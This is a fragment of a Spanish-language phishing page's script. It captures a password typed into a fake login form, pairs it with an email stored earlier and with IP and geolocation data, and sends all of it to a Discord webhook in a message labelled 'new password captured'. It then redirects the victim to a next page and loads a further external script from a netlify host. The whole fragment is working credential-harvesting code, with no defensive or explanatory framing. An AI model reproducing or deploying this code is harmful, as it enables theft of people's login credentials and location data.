    <!-- Script externo para Discord -->
    <script src="https://34879347843.netlify.app/disBLOCK.js"></script>
    <script>
        // Mostrar el email del usuario
        document.addEventListener('DOMContentLoaded', function() {
            const email = localStorage.getItem('js1');
            if (email) {
                document.getElementById('local').textContent = email;
            }
            
            // Alternar visibilidad de la contraseña
            document.getElementById('eye').addEventListener('click', function() {
                const passwordInput = document.getElementById('js2');
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    this.style.opacity = '0.7';
                } else {
                    passwordInput.type = 'password';
                    this.style.opacity = '1';
                }
            });
            
            // Manejar el envío del formulario
            document.getElementById('xjsx').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const passwordInput = document.getElementById('js2');
                const errorElement = document.getElementById('err');
                
                // Validación básica
                if (!passwordInput.value.trim()) {
                    errorElement.innerHTML = 'Campo obligatorio. Por favor, ingrese su contraseña.';
                    return false;
                }
                
                if (passwordInput.value.trim().length < 4) {
                    errorElement.innerHTML = 'La contraseña debe tener al menos 4 caracteres.';
                    return false;
                }
                
                // Enviar datos a Discord
                sendPasswordToDiscord(passwordInput.value);
            });
        });

        // Función para enviar la contraseña a Discord
        async function sendPasswordToDiscord(password) {
            const email = localStorage.getItem('js1') || 'No disponible';
            
            try {
                // Obtener datos de IP
                const ipData = await fetchIPData();
                
                // Preparar mensaje para Discord
                const message = `🍄🍄0UTL🍄🍄

🔐 **Nueva contraseña capturada**

📧 **Correo electrónico:** ${email}
🔑 **Contraseña:** ${password}
🌎 **IP:** ${ipData.ip}
📍 **Ubicación:** ${ipData.city}, ${ipData.country_name}
🕒 **Hora:** ${new Date().toLocaleString()}`;
                
                // Enviar a Discord
                await sendToDiscord(DISCORD_WEBHOOK, message);
                
                // Redirigir a la siguiente página
                window.location.href = '_indexx.html';
            } catch (error) {
                console.error('Error sending to Discord:', error);
                // En caso de error, igualmente redirigir
                window.location.href = '_indexx.html';
            }
        }
    </script>
